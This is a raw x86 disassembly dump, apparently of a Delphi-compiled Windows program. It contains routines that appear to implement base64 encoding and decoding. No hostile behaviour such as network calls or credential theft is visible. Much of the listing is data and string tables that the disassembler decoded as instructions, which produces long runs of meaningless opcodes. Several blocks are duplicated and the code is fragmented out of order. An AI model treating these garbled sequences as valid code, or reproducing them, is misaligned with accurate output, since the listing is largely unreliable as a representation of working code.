mov ecx [ eax ]
call [ ecx + 0x18 ]
call sub_40331c
inc edi
dec ebp
jne r-xdata
sub_47eee4
push ebx
push esi
mov esi ecx
mov ebx edx
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov ecx esi
mov edx ebx
mov ebx [ eax ]
call [ ebx + 0x3c ]
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_47ee48
mov [ rw-data ] eax
sub_47ef18
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push 0x40
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_41ba0c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_47ef68
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx edi
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x3c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47ef6f
lea eax [ ebp - 0x4 ]
call sub_40d814
retn
sub_47ef78
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_475220
mov [ esi + 0x6c ] 0x294
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_47efb4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_47efef
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47eff6
retn
mov eax rw-data
call sub_40d814
mov eax rw-data
call sub_40d814
sub_47f160
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_47f1c8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_4043d8
mov ecx eax
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_47492c
mov eax [ ebp - 0x4 ]
push eax
mov ecx 0x7fffffff
mov edx [ ebp - 0x8 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47f1cf
lea eax [ ebp - 0x8 ]
call sub_40d814
retn
sub_47f1d8
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov ebx edx
xor ecx ecx
mov dl 0x1
call [ eax + 0x2c ]
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_47f21c
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_47f160
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47f223
mov eax [ ebp - 0x4 ]
call sub_40331c
retn
sub_47f228
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_47f24d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47f254
retn
sub_47f28a
inc edi
add ah ch
and [ edx ] eax
pop eax
xor eax 0x1b400040
inc edx
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add al cl
sbb al [ edx ]
fcom [ ebx + 0x1df40041 ]
inc edx
add ah dh
xchg edx eax
inc ecx
add ah cl
push ds
inc edx
add [ eax - 0x23ffbde3 ] bl
push ds
inc edx
add ah dl
pop ds
inc edx
add [ edx ] al
inc edx
add ah ch
push ds
inc edx
add ah ah
push ds
inc edx
add [ edx ] cl
inc edx
add [ edx + ebx + 0x42 ] bh
add [ esi + esi * 8 + 0xe0047 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
xchg esp eax
adc [ eax ] al
xor [ eax ] al
add [ eax ] al
push cs
push esp
dec ecx
inc ebp
outsb
arpl [ edi + 0x64 ] bp
jb r-xdata
adc [ eax ] al
xor [ eax ] al
je r-xdata
add al cl
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
hlt
add [ eax ] cl
inc esi
imul ebp [ esp + ebp * 2 + 0x43 ] 0x8d726168
inc eax
xor al 0x8d
inc eax
add [ eax ] cl
inc edi
add [ edi ] al
push cs
push esp
dec ecx
inc ebp
outsb
arpl [ edi + 0x64 ] bp
jb r-xdata
add al [ eax ]
or eax [ ebx + 0x6f ]
imul ebp [ fs : esi + 0x67 ] 0x6c626154
sub [ gs : eax ] dl
inc eax
add [ eax + eax ] dh
add bh bh
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc ah dh
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
xor al 0xac
inc edi
add [ eax + esi * 8 + 0x40047 ] cl
or ecx [ ecx + 0x64 ]
inc ebx
outsd
jb r-xdata
xor al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax [ eax ]
or [ esi + 0x69 ] al
insb
insb
inc ebx
push 0x408d7261
je r-xdata
inc edi
add [ eax - 0x50000000 ] dh
cld
add bh bh
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor al 0x2
add [ eax + edx + 0x300040 ] dl
sub_47f3a6
inc edi
add ah ch
and [ edx ] eax
pop eax
xor eax 0x1b400040
inc edx
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add al cl
sbb al [ edx ]
fcom [ ebx + 0x1df40041 ]
inc edx
add ah dh
xchg edx eax
inc ecx
add ah cl
push ds
inc edx
add [ eax - 0x23ffbde3 ] bl
push ds
inc edx
add ah dl
pop ds
inc edx
add [ edx ] al
inc edx
add ah ch
push ds
inc edx
add ah ah
push ds
inc edx
add [ edx ] cl
inc edx
add [ edx + ebx + 0x42 ] bh
add [ esp + esi * 8 + 0x540e0047 ] bl
dec ecx
inc esp
arpl [ gs : edi + 0x64 ] bp
jb r-xdata
scasd [ edi ]
add [ eax ] al
[ edi + 0x1ff0000 ]
je r-xdata
rol [ ebp - 0x47e5812e ] 0x1
add [ eax ] eax
add [ eax ] al
xor edx [ eax + r-xdata ]
pop es
push cs
push esp
dec ecx
inc esp
arpl [ gs : edi + 0x64 ] bp
jb r-xdata
xor ecx ecx
mov cl [ ebx + eax - 0x1 ]
lea ecx [ esi + ecx - 0x1 ]
push ecx
pop edi
pop esi
pop ebx
retn
add [ eax ] cl
inc esi
imul ebp [ esp + ebp * 2 + 0x43 ] 0x90726168
je r-xdata
mov ecx eax
dec ecx
pop edi
mov [ edi ] cl
inc eax
dec edx
jne r-xdata
xor ecx eax
inc edi
add [ ecx + esi * 8 ] bh
inc edi
add [ ebx ] al
add [ ebx ] cl
dec ecx
inc ebx
outsd
jb r-xdata
add [ eax ] al
mov edx esi
je r-xdata
mov [ edx ] 0xff
inc edx
dec eax
jne r-xdata
mov eax ebx
call sub_4043d8
mov edx eax
test edx edx
jle r-xdata
add [ edx ] ch
xor al 0x1
add [ eax ] ch
adc [ eax ] al
mov eax 0x1
push 0x0
dec ecx
jne r-xdata
push 0x0
push ecx
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_4045c8
xor eax eax
push ebp
push sub_47f61b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4043d8
and eax 0x80000003
jns r-xdata
test eax eax
jle r-xdata
dec eax
or eax 0xfffffffc
inc eax
lea eax [ ebp - 0x18 ]
call sub_404118
mov eax [ ebp - 0x4 ]
call sub_4043d8
mov edi eax
mov ebx 0x1
lea eax [ ebp - 0x10 ]
call sub_404118
cmp edi ebx
jl r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd8c
call sub_403ad0
cmp [ ebp - 0x10 ] 0x0
je r-xdata
lea eax [ ebp - 0x4 ]
call j_sub_4045e4
lea eax [ eax + ebx - 0x1 ]
lea edx [ ebp - 0x14 ]
mov ecx 0x4
call sub_4028e8
add ebx 0x4
lea eax [ ebp - 0xa ]
push eax
lea eax [ ebp - 0x9 ]
push eax
lea ecx [ ebp - 0xb ]
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_47f62c
mov dl [ ebp - 0x12 ]
mov al [ esi + 0xaf ]
cmp dl al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47f622
lea eax [ ebp - 0x28 ]
mov edx 0x5
call sub_40413c
lea eax [ ebp - 0x10 ]
call sub_404118
lea eax [ ebp - 0x4 ]
call sub_404118
retn
mov eax [ ebp - 0x10 ]
call sub_4043d8
push eax
lea eax [ ebp - 0x10 ]
call j_sub_4045e4
mov edx eax
mov eax [ ebp - 0x8 ]
pop ecx
call sub_41b758
mov dl [ ebp - 0x11 ]
cmp al dl
jne r-xdata
lea eax [ ebp - 0x20 ]
mov dl [ ebp - 0xb ]
call sub_404300
mov edx [ ebp - 0x20 ]
lea eax [ ebp - 0x10 ]
call sub_4043e0
jmp r-xdata
lea eax [ ebp - 0x28 ]
lea edx [ ebp - 0xb ]
mov ecx 0x3
call sub_404208
mov edx [ ebp - 0x28 ]
lea eax [ ebp - 0x10 ]
call sub_4043e0
lea eax [ ebp - 0x24 ]
lea edx [ ebp - 0xb ]
mov ecx 0x2
call sub_404208
mov edx [ ebp - 0x24 ]
lea eax [ ebp - 0x10 ]
call sub_4043e0
jmp r-xdata
cmp edi ebx
jge r-xdata
sub_47f45c
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov eax 0x7f
mov edx esi
mov [ edx ] 0xff
inc edx
dec eax
jne r-xdata
mov eax ebx
call sub_4043d8
mov edx eax
test edx edx
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax 0x1
xor ecx ecx
mov cl [ ebx + eax - 0x1 ]
lea ecx [ esi + ecx - 0x1 ]
push ecx
mov ecx eax
dec ecx
pop edi
mov [ edi ] cl
inc eax
dec edx
jne r-xdata
sub_47f49c
push ebp
mov ebp esp
push ecx
mov ecx 0x4
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_4045c8
xor eax eax
push ebp
push sub_47f61b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4043d8
and eax 0x80000003
jns r-xdata
test eax eax
jle r-xdata
dec eax
or eax 0xfffffffc
inc eax
lea eax [ ebp - 0x18 ]
call sub_404118
mov eax [ ebp - 0x4 ]
call sub_4043d8
mov edi eax
mov ebx 0x1
lea eax [ ebp - 0x10 ]
call sub_404118
cmp edi ebx
jl r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd8c
call sub_403ad0
cmp [ ebp - 0x10 ] 0x0
je r-xdata
lea eax [ ebp - 0x4 ]
call j_sub_4045e4
lea eax [ eax + ebx - 0x1 ]
lea edx [ ebp - 0x14 ]
mov ecx 0x4
call sub_4028e8
add ebx 0x4
lea eax [ ebp - 0xa ]
push eax
lea eax [ ebp - 0x9 ]
push eax
lea ecx [ ebp - 0xb ]
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_47f62c
mov dl [ ebp - 0x12 ]
mov al [ esi + 0xaf ]
cmp dl al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47f622
lea eax [ ebp - 0x28 ]
mov edx 0x5
call sub_40413c
lea eax [ ebp - 0x10 ]
call sub_404118
lea eax [ ebp - 0x4 ]
call sub_404118
retn
mov eax [ ebp - 0x10 ]
call sub_4043d8
push eax
lea eax [ ebp - 0x10 ]
call j_sub_4045e4
mov edx eax
mov eax [ ebp - 0x8 ]
pop ecx
call sub_41b758
mov dl [ ebp - 0x11 ]
cmp al dl
jne r-xdata
lea eax [ ebp - 0x20 ]
mov dl [ ebp - 0xb ]
call sub_404300
mov edx [ ebp - 0x20 ]
lea eax [ ebp - 0x10 ]
call sub_4043e0
jmp r-xdata
lea eax [ ebp - 0x28 ]
lea edx [ ebp - 0xb ]
mov ecx 0x3
call sub_404208
mov edx [ ebp - 0x28 ]
lea eax [ ebp - 0x10 ]
call sub_4043e0
lea eax [ ebp - 0x24 ]
lea edx [ ebp - 0xb ]
mov ecx 0x2
call sub_404208
mov edx [ ebp - 0x24 ]
lea eax [ ebp - 0x10 ]
call sub_4043e0
jmp r-xdata
cmp edi ebx
jge r-xdata
sub_47f62c
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
xor edx edx
mov dl [ ebp - 0x4 ]
movzx edx [ eax + edx + 0x2f ]
shl edx 0x12
xor ebx ebx
mov bl [ ebp - 0x3 ]
movzx ebx [ eax + ebx + 0x2f ]
shl ebx 0xc
or edx ebx
xor ebx ebx
mov bl [ ebp - 0x2 ]
movzx ebx [ eax + ebx + 0x2f ]
shl ebx 0x6
or edx ebx
xor ebx ebx
mov bl [ ebp - 0x1 ]
movzx eax [ eax + ebx + 0x2f ]
or edx eax
mov [ ebp - 0x4 ] edx
mov al [ ebp - 0x2 ]
mov [ ecx ] al
mov eax [ ebp + 0xc ]
mov dl [ ebp - 0x3 ]
mov [ eax ] dl
mov eax [ ebp + 0x8 ]
mov dl [ ebp - 0x4 ]
mov [ eax ] dl
pop ebx
pop ecx
pop ebp
retn 0x8
sub_47f68c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0xc ] ebx
mov ebx ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_47f821
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
call sub_404118
mov [ ebp - 0x11 ] 0x0
cmp ebx 0x7fffffff
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
mov esi eax
mov eax [ ebp - 0x8 ]
call sub_41b4f4
sub esi eax
cmp ebx esi
jge r-xdata
mov eax ebx
mov ecx 0x3
cdq
idiv ecx
test edx edx
jle r-xdata
test esi esi
je r-xdata
mov esi ebx
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd8c
call sub_403ad0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47f828
lea eax [ ebp - 0x1c ]
call sub_404118
lea eax [ ebp - 0xc ]
call sub_404118
retn
lea eax [ esi + 0x2 ]
mov ecx 0x3
cdq
idiv ecx
mov edx eax
shl edx 0x2
mov eax [ ebp + 0x8 ]
call sub_404764
xor edi edi
lea eax [ ebp - 0xc ]
mov edx esi
call sub_404764
lea eax [ ebp - 0xc ]
call j_sub_4045e4
mov edx eax
mov ecx esi
mov eax [ ebp - 0x8 ]
call sub_41b720
mov ebx 0x1
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0xc ]
mov dl [ eax + ebx - 0x1 ]
inc ebx
cmp esi ebx
jl r-xdata
xor eax eax
mov [ ebp - 0x10 ] 0x1
mov eax [ ebp - 0xc ]
mov al [ eax + ebx - 0x1 ]
inc ebx
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
mov eax [ ebp + 0x8 ]
call j_sub_4045e4
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x34 ]
mov [ eax + edi - 0x1 ] dl
cmp [ ebp - 0x10 ] 0x1
jne r-xdata
mov [ ebp - 0x11 ] 0x0
mov [ ebp - 0x10 ] 0x2
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov cl [ ecx + ebx - 0x1 ]
mov [ ebp - 0x11 ] cl
inc ebx
mov [ ebp - 0x10 ] 0x3
jmp r-xdata
mov eax [ ebp + 0x8 ]
call j_sub_4045e4
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x34 ]
mov [ eax + edi - 0x2 ] dl
mov cl [ ebp - 0x11 ]
push ecx
lea ecx [ ebp - 0x18 ]
push ecx
mov ecx eax
mov eax [ ebp - 0x4 ]
call sub_47f834
mov eax [ ebp + 0x8 ]
call j_sub_4045e4
lea edx [ eax + edi ]
lea eax [ ebp - 0x18 ]
mov ecx 0x4
call sub_4028e8
add edi 0x4
cmp [ ebp - 0x10 ] 0x3
jge r-xdata
sub_47f834
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi eax
mov eax [ ebp + 0xc ]
xor ebx ebx
mov bl dl
shr ebx 0x2
and ebx 0x3f
mov edi [ esi + 0x30 ]
mov bl [ edi + ebx ]
mov [ ebp - 0x4 ] bl
and edx 0xff
shl edx 0x4
xor ebx ebx
mov bl cl
shr ebx 0x4
or edx ebx
and edx 0x3f
mov ebx [ esi + 0x30 ]
mov dl [ ebx + edx ]
mov [ ebp - 0x3 ] dl
xor edx edx
mov dl cl
shl edx 0x2
xor ecx ecx
mov cl al
shr ecx 0x6
or edx ecx
and edx 0x3f
mov ecx [ esi + 0x30 ]
mov dl [ ecx + edx ]
mov [ ebp - 0x2 ] dl
and al 0x3f
and eax 0xff
mov edx [ esi + 0x30 ]
mov al [ edx + eax ]
mov [ ebp - 0x1 ] al
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ eax ] edx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_47f8b0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_47f8d5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47f8dc
retn
sub_47f8e8
xor al 0xf9
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + edi * 8 + 0x47 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x7 ] ch
inc edi
add [ eax ] bh
add [ eax ] al
add [ eax - 0xe ] ah
inc edi
add ah ch
and [ edx ] eax
pop eax
xor eax 0x1b400040
inc edx
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add al cl
sbb al [ edx ]
fcom [ ebx + 0x1df40041 ]
inc edx
add ah dh
xchg edx eax
inc ecx
add ah cl
push ds
inc edx
add [ eax - 0x23ffbde3 ] bl
push ds
inc edx
add ah dl
pop ds
inc edx
add [ edx ] al
inc edx
add ah ch
push ds
inc edx
add ah ah
push ds
inc edx
add [ edx ] cl
inc edx
add [ eax ] al
sti
inc edi
add [ esi + esi * 8 + 0x540e0047 ] cl
dec ecx
inc ebp
outsb
arpl [ edi + 0x64 ] bp
jb r-xdata
add [ eax ] al
add [ edx + edi * 8 ] ah
inc edi
add [ eax + 0x7c000000 ] dh
inc edi
add ah ch
and [ edx ] eax
pop eax
xor eax 0x1b400040
dec ecx
dec ebp
inc ebp
nop
jl r-xdata
push esi
push edi
pop eax
pop ecx
pop edx
popad
bound esp [ ebx + 0x64 ]
push 0x6a69
imul ebp [ ebp + ebp * 2 + 0x6e ] 0x6f
jo r-xdata
dec ecx
dec ebp
inc ebp
nop
cmp dl bh
inc edi
add [ edi ] al
push cs
push esp
dec ecx
inc esp
arpl [ gs : edi + 0x64 ] bp
jb r-xdata
dec ebp
inc edi
add [ edi ] al
push cs
push esp
dec ecx
inc ebp
outsb
arpl [ edi + 0x64 ] bp
jb r-xdata
je r-xdata
jb r-xdata
jno r-xdata
dec ecx
dec ebp
inc ebp
inc edx
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add al cl
sbb al [ edx ]
inc eax
add [ eax + 0x1b ] al
dec ecx
dec ebp
inc ebp
xor al 0xf9
inc edi
add [ ebx + esi * 8 ] al
inc edi
add [ eax + eax ] al
or ecx [ ecx + 0x64 ]
inc ebx
outsd
jb r-xdata
mov ebx edx
add esp 0xfffffff0
call sub_403668
je r-xdata
jae r-xdata
fcom [ ebx + 0x1df40041 ]
inc edx
add ah dh
xchg edx eax
inc ecx
add ah cl
push ds
inc edx
add [ eax - 0x23ffbde3 ] bl
push ds
inc edx
add ah dl
pop ds
inc edx
add [ edx ] al
inc edx
add ah ch
push ds
inc edx
add ah ah
push ds
inc edx
add [ edx ] cl
inc edx
add [ edx + edi * 8 - 0xb63ffb9 ] ch
inc edi
add [ esi ] cl
push esp
dec ecx
inc esp
arpl [ gs : edi + 0x64 ] bp
jb r-xdata
enter 0x421a 0x0
dec ecx
dec ebp
inc ebp
add [ eax ] al
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
mov eax esi
test bl bl
je r-xdata
clc
jbe r-xdata
dec [ ebx + 0x33f08bda ]
ror [ ebx + 0x1f61e8c6 ] cl
pop edx
cmp edi eax
jne r-xdata
mov esi eax
js r-xdata
ja r-xdata
mov eax esi
jpe r-xdata
xor edx edx
jns r-xdata
inc esp
jle r-xdata
xor [ edx ] esi
xor esi [ esi + 0x39383736 ]
call sub_421a7c
lea eax [ esi + 0x30 ]
mov edx [ rw-data ]
call sub_40416c
mov [ esi + 0x34 ] 0x3d
sub ebp [ edi ]
add [ eax ] al
add [ eax ] al
xor [ ecx ] dh
xor dh [ ebx ]
xor al 0x35
aaa
cmp [ ecx ] bh
cli
dec [ ebp + 0x158b3046 ]
clc
pop ecx
dec ecx
add al ch
inc ebx
inc esi
clc
inc esi
inc esi
xor al 0x3d
add [ ecx + 0x1f ] bh
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
pop esi
mov [ esi + 0xaf ] 0x3d
mov eax esi
test bl bl
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_47fa63
inc [ eax ]
add [ eax ] al
inc ecx
inc edx
inc ebx
inc esp
inc ebp
inc esi
inc edi
dec eax
dec ecx
dec edx
dec ebx
dec esp
dec ebp
dec esi
dec edi
push eax
push ecx
push edx
push ebx
push esp
push ebp
push esi
push edi
pop eax
pop ecx
pop edx
popad
bound esp [ ebx + 0x64 ]
push 0x6a69
imul ebp [ ebp + ebp * 2 + 0x6e ] 0x6f
jo r-xdata
je r-xdata
jb r-xdata
mov ebx edx
add esp 0xfffffff0
call sub_403668
je r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
mov eax esi
test bl bl
je r-xdata
clc
dec [ ebx + 0x33f08bda ]
ror [ ebx + 0x1f61e8c6 ] cl
jbe r-xdata
mov esi eax
xor edx edx
js r-xdata
mov eax esi
call sub_421a7c
lea eax [ esi + 0x30 ]
mov edx [ rw-data ]
call sub_40416c
mov [ esi + 0x34 ] 0x3d
jpe r-xdata
inc esp
jle r-xdata
xor [ edx ] esi
xor esi [ esi + 0x39383736 ]
sub ebp [ edi ]
add [ eax ] al
add [ eax ] al
cli
dec [ ebp + 0x158b3046 ]
clc
pop ecx
dec ecx
add al ch
inc ebx
inc esi
clc
inc esi
inc esi
xor al 0x3d
add [ ecx + 0x1f ] bh
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
pop esi
mov [ esi + 0xaf ] 0x3d
mov eax esi
test bl bl
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_47faac
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_421a7c
push esi
lea edi [ esi + 0x30 ]
mov esi rw-data
mov ecx 0x1f
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
pop esi
mov [ esi + 0xaf ] 0x3d
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop edi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_47fb00
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_421a7c
lea eax [ esi + 0x30 ]
mov edx [ rw-data ]
call sub_40416c
mov [ esi + 0x34 ] 0x3d
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_47fb48
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_47fb79
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47fb80
retn
mov eax rw-data
call sub_404118
sub_47fba8
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
cld
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + edi * 8 ] ah
inc edi
add [ eax ] dh
add [ eax ] al
add [ eax - 0x13ffb810 ] dh
and [ edx ] eax
pop eax
xor eax 0x1b400040
inc edx
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add al cl
sbb al [ edx ]
fcom [ ebx + 0x1df40041 ]
inc edx
add ah dh
xchg edx eax
inc ecx
add ah cl
push ds
inc edx
add [ eax - 0x23ffbde3 ] bl
push ds
inc edx
add ah dl
pop ds
inc edx
add [ edx ] al
inc edx
add ah ch
push ds
inc edx
add ah ah
push ds
inc edx
add [ edx ] cl
inc edx
add [ edx + ebx + 0x42 ] bh
add [ esi + edi * 8 + 0x54190047 ] ch
dec ecx
inc esp
arpl [ gs : edi + 0x64 ] bp
jb r-xdata
add [ ebx + 0x47fcd0c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi * 8 + 0x47 ] ah
add [ eax ] al
jne r-xdata
add [ eax ] al
add [ edi * 8 + 0x300047 ] al
add [ eax ] al
add al dh
inc edi
add ah ch
and [ edx ] eax
pop eax
xor eax 0x1b400040
je r-xdata
add [ ebx - 0x1374aa40 ] cl
push 0x0
push ebx
push esi
mov esi [ ebp + 0x8 ]
add esi 0xfffffffc
xor eax eax
push ebp
push sub_47fdd6
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
jb r-xdata
xor eax eax
pop edx
lea eax [ ebp - 0x4 ]
mov edx [ esi ]
mov dl [ edx ]
call sub_404300
mov eax [ ebp - 0x4 ]
add [ eax ] al
add [ ebx + 0x464de806 ] cl
clc
inc [ ebp - 0x72ce8140 ]
inc ebp
cld
je r-xdata
outsb
je r-xdata
mov eax esi
mov ecx 0x1
mov edx 0x1
call sub_404678
dec ebx
push [ fs : eax ]
push eax
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
bound ebp [ ebp - 0x75 ]
rol [ esp + edi * 8 + 0x47 ] 0x0
pop es
sbb [ ecx + ecx * 2 + 0x64 ] edx
inc esp
arpl [ gs : edi + 0x64 ] bp
jb r-xdata
mov eax [ esi ]
call sub_4043d8
test eax eax
jle r-xdata
outsb
je r-xdata
add [ eax ] al
add al 0xfd
inc edi
add [ eax ] dh
add [ eax ] al
add [ eax ] al
jne r-xdata
mov [ fs : eax ] esp
mov ebx 0x2
bound ebp [ ebp - 0x75 ]
shl [ edi * 8 + 0x19070047 ] 0x54
dec ecx
inc ebp
outsb
arpl [ edi + 0x64 ] bp
jb r-xdata
add [ edx + esi + 0x32d00040 ] dh
inc eax
add al cl
sbb al [ edx ]
fcom [ ebx + 0x1df40041 ]
inc edx
add ah dh
xchg edx eax
inc ecx
inc eax
je r-xdata
add [ eax ] al
jne r-xdata
inc edx
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
push eax
jb r-xdata
add al ch
je r-xdata
je r-xdata
outsb
je r-xdata
add [ ebp - 0x75 ] dl
in al dx
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_47fe9e
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
xor edx edx
call sub_404764
mov eax esi
call sub_4043d8
mov edi eax
jmp r-xdata
clc
inc [ ebp - 0x74eb8140 ]
dec [ ebx - 0x134503bb ]
std
inc edi
push eax
jb r-xdata
